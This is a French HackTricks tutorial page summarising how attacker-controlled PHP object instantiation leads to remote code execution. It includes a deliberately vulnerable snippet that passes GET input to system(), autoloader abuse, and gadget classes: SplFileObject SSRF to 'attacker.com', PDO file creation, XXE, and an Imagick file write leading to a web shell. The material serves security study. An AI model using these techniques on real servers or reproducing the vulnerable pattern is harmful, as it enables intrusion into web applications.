# PHP - RCE abusant de la cr√©ation d'objet : new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

Ceci est essentiellement un r√©sum√© de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introduction

La cr√©ation de nouveaux objets arbitraires, tels que `new $_GET["a"]($_GET["a"])`, peut conduire √† une ex√©cution de code √† distance (RCE), comme d√©taill√© dans un [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Ce document met en √©vidence diverses strat√©gies pour atteindre la RCE.

## RCE via Classes Personnalis√©es ou Autoloading

La syntaxe `new $a($b)` est utilis√©e pour instancier un objet o√π **`$a`** repr√©sente le nom de la classe et **`$b`** est le premier argument pass√© au constructeur. Ces variables peuvent provenir des entr√©es utilisateur comme GET/POST, o√π elles peuvent √™tre des cha√Ænes ou des tableaux, ou de JSON, o√π elles pourraient se pr√©senter sous d'autres types.

Consid√©rez l'extrait de code ci-dessous :
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Dans ce cas, d√©finir `$a` sur `App` ou `App2` et `$b` sur une commande syst√®me (par exemple, `uname -a`) entra√Æne l'ex√©cution de cette commande.

**Les fonctions d'autoloading** peuvent √™tre exploit√©es si aucune de ces classes n'est directement accessible. Ces fonctions chargent automatiquement des classes √† partir de fichiers lorsque cela est n√©cessaire et sont d√©finies √† l'aide de `spl_autoload_register` ou `__autoload` :
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Le comportement de l'autoloading varie selon les versions de PHP, offrant diff√©rentes possibilit√©s de RCE.

## RCE via Classes Int√©gr√©es

En l'absence de classes personnalis√©es ou d'autoloaders, **les classes PHP int√©gr√©es** peuvent suffire pour le RCE. Le nombre de ces classes varie entre 100 et 200, en fonction de la version de PHP et des extensions. Elles peuvent √™tre list√©es en utilisant `get_declared_classes()`.

Les constructeurs d'int√©r√™t peuvent √™tre identifi√©s via l'API de r√©flexion, comme le montre l'exemple suivant et le lien [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via des m√©thodes sp√©cifiques inclut :**

### **SSRF + D√©s√©rialisation Phar**

La classe `SplFileObject` permet SSRF via son constructeur, permettant des connexions √† n'importe quelle URL :
```php
new SplFileObject('http://attacker.com/');
```
SSRF peut conduire √† des attaques de d√©s√©rialisation dans les versions de PHP ant√©rieures √† 8.0 utilisant le protocole Phar.

### **Exploitation des PDOs**

Le constructeur de la classe PDO permet des connexions √† des bases de donn√©es via des cha√Ænes DSN, ce qui peut potentiellement permettre la cr√©ation de fichiers ou d'autres interactions :
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Les versions de PHP jusqu'√† 5.3.22 et 5.4.12 √©taient susceptibles aux attaques XXE via les constructeurs `SoapClient` et `SimpleXMLElement`, en fonction de la version de libxml2.

## RCE via l'extension Imagick

Dans l'analyse des **d√©pendances d'un projet**, il a √©t√© d√©couvert qu'**Imagick** pouvait √™tre exploit√© pour **l'ex√©cution de commandes** en instanciant de nouveaux objets. Cela pr√©sente une opportunit√© d'exploiter des vuln√©rabilit√©s.

### Analyseur VID

La capacit√© de l'analyseur VID √† √©crire du contenu dans n'importe quel chemin sp√©cifi√© dans le syst√®me de fichiers a √©t√© identifi√©e. Cela pourrait conduire √† la mise en place d'un shell PHP dans un r√©pertoire accessible via le web, r√©alisant ainsi une Ex√©cution de Code √† Distance (RCE).

#### Analyseur VID + T√©l√©chargement de fichiers

Il est not√© que PHP stocke temporairement les fichiers t√©l√©charg√©s dans `/tmp/phpXXXXXX`. L'analyseur VID dans Imagick, utilisant le protocole **msl**, peut g√©rer des jokers dans les chemins de fichiers, facilitant le transfert du fichier temporaire vers un emplacement choisi. Cette m√©thode offre une approche suppl√©mentaire pour r√©aliser une √©criture de fichiers arbitraire dans le syst√®me de fichiers.

### Plantage PHP + Brute Force

Une m√©thode d√©crite dans le [**rapport original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) implique le t√©l√©chargement de fichiers qui d√©clenchent un plantage du serveur avant leur suppression. En for√ßant le nom du fichier temporaire, il devient possible pour Imagick d'ex√©cuter du code PHP arbitraire. Cependant, cette technique s'est r√©v√©l√©e efficace uniquement dans une version obsol√®te d'ImageMagick.

## R√©f√©rences

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
